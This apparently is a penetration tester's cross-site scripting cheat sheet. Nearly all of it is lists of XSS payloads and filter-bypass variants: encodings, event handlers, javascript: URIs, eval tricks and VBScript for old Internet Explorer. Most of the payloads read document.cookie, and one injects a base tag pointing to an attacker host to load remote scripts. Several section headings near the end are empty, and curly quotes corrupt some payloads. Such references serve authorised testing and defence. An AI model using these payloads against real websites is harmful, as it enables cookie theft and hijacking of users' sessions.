# Cross Site Scripting (XSS)

* XSS Types
  * Reflected XSS
  * Stored XSS
  * DOM Based XSS
* Payloads

**Basic Approach**

```html
"><script>alert(document.cookie)</script>
```

**Anti XSS Filter Bypass**

```html
“><script >alert(document.cookie)</script >
“><ScRiPt>alert(document.cookie)</ScRiPt>
“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00“><script>alert(document.cookie)</script>
```

**Add Just Attribute**

```javascript
“ onfocus=”alert(1)
```

**Add JS**&#x20;

```javascript
‘; alert(1); var foo=’
```

**Add Attribute containing URL**

```javascript
javascript:alert(1);
#”onclick=”javascript:alert(1)
```

**Encode Script**

```html
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Event Handler**

```html
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
<!-- Event Handler in closing tag -->
</a onmousemove=alert(1)>
```

**Script-Pseudo Protocols**

```html
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

**Dynamically Evaluated Styles**

```html
<x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

**Bypassing Filters: HTML**

```html
<img onerror=alert(1) src=a>
<iMg onerror=alert(1) src=a>
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
<!-- Introduce Event Handlers -->
<x onclick=alert(1) src=a>Click here</x>
<!-- Introduce tags -->
<base href=”http://mdattacker.net/badscripts/”>
...
<script src=”goodscript.js”></script>
```

**Replace space between tag and attribute**

```html
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<!-- Add Random tags -->
<script/anyjunk>alert(1)</script>
```

**Attribute Names**

```html
<img o[%00]nerror=alert(1) src=a>
```

**Attribute Delimiters**

```html
<img onerror=”alert(1)”src=a>
<img onerror=’alert(1)’src=a>
<img onerror=`alert(1)`src=a>
<img src=`a`onerror=alert(1)>
<img/onerror=”alert(1)”src=a>
```

Attribute Values

```html
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
<!-- HTML Encode Values -->
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```

**Tag Brackets**

```html
%253cimg%20onerror=alert(1)%20src=a%253e
%3cimg onerror=alert(1) src=a%3e -> <img onerror=alert(1) src=a>
«img onerror=alert(1) src=a»
%u00AB img onerror=alert(1) src=a %u00BB
<<script>alert(1);//<</script>
<script<{alert(1)}/></script>
```

**Character sets**

* **UTF-7**

```html
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```

* **US-ASCII**

```html
¼script¾alert(document.cookie)¼/script¾
```

* **UTF-16**

```html
ÿþ<.s.c.r.i.p.t.>.a.l.e.r.t.(.d.o.c.u.m.e.n.t...c.o.o.k.i.e.).<./.s.c.r.i.p.t.>.
```

**Shift-JIS**

```html
<img src="image.gif" alt="[input1]" /> ... [input2]
```

* Here for `[input1]`, " is blocked. For `[input2]`, payloads with angle brackets are blocked
* Bypass
  * `input1: [%f0]`&#x20;
  * `input2: “onload=alert(1);`
* Final Payload

```html
<img src="image.gif" alt="? /> ... "onload=alert(1);Bypassing Filters: Script Code
```

**Bypassing Filters: Script Code**

* **JS escaping**

```html
<script>a\u006cert(1);</script>
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
<script>eval(‘a\l\ert\(1\)’);</script>
```

* **Dynamically construct strings**

```html
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
```

* **Alternatives to eval**

```html
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
```

* **Alternative to Dots**

```html
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
```

* **Combining Multiple techniques**

```html
<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
#x29;&#x27;&#x29; src=a>
```

**Using VBScript**

```html
<script language=vbs>MsgBox 1</script>
<img onerror=”vbs:MsgBox 1” src=a>
<img onerror=MsgBox+1 language=vbs src=a>
<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
```

**Combining VBScript and JavaScript**

```html
<script>execScript(“MsgBox 1”,”vbscript”);</script>
<script language=vbs>execScript(“alert(1)”)</script>
<script>execScript('execScript"alert(1)","javascript"',"vbscript");</script>
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
```

**Internet Explorer**

```html
<img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
```

**Bypass Sanitization**

```html
<script><script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<scr<object>ipt>alert(1)</script>
<!-- JS Bypass -->
var a = ‘foo’; -> var a = ‘foo\\’; alert(1);//’;
</script><script>alert(1)</script>
<script>var a = ‘</script><script>alert(1)</script>
```

**Exploiting XSS Via Cookies**

**Exploiting XSS in the Referer Header**

**Testing for XSS in Web Mail Applications**

**DOM XSS**

* Tools
  *   DOMTracer

      [https://blueinfy.com/#DOMTracer](https://blueinfy.com/#DOMTracer)
